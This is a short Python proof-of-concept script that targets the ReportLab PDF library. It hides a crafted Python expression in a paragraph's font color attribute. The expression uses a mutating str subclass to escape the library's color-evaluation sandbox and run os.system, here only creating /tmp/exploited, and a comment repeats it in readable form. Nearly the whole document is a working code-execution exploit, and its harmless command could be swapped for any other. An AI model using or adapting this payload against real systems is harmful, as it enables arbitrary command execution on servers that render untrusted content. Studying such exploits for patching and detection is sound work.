from reportlab.platypus import SimpleDocTemplate, Paragraph
from io import BytesIO
stream_file = BytesIO()
content = []

def add_paragraph(text, content):
    """ Add paragraph to document content"""
    content.append(Paragraph(text))

def get_document_template(stream_file: BytesIO):
    """ Get SimpleDocTemplate """
    return SimpleDocTemplate(stream_file)

def build_document(document, content, **props):
    """ Build pdf document based on elements added in `content`"""
    document.build(content, **props)



doc = get_document_template(stream_file)
#
# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
#[
#    [
#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
#        for Word in [
#            orgTypeFun(
#                'Word',
#                (str,),
#                {
#                    'mutated': 1,
#                    'startswith': lambda self, x: False,
#                    '__eq__': lambda self, x: self.mutate()
#                    and self.mutated < 0
#                    and str(self) == x,
#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
#                    '__hash__': lambda self: hash(str(self)),
#                },
#            )
#        ]
#    ]
#    for orgTypeFun in [type(type(1))]
#]

add_paragraph("""
            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>""", content)
build_document(doc, content)
